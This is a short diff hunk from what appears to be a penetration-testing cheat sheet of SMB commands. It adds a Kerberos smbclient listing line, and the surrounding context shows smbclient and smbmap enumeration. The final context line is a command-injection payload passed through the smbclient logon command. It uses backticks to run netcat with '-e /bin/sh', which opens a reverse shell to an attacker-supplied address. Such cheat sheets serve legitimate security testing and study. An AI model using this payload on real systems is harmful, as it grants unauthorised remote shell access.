@@ -229,6 +229,7 @@ $ smbclient -L <IP address>
 $ smbclient -L <IP address> -U <username>
 $ smbclient \\\\<IP address>\\c$
 $ smbclient \\\\<IP address>\\c$ -U <username>
+$ smbclient //<IP address>/<share> -k -c ls -no-pass
 $ smbmap -H <IP address>
 $ smbmap -H <IP address> -u <username> -p <password>
 smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
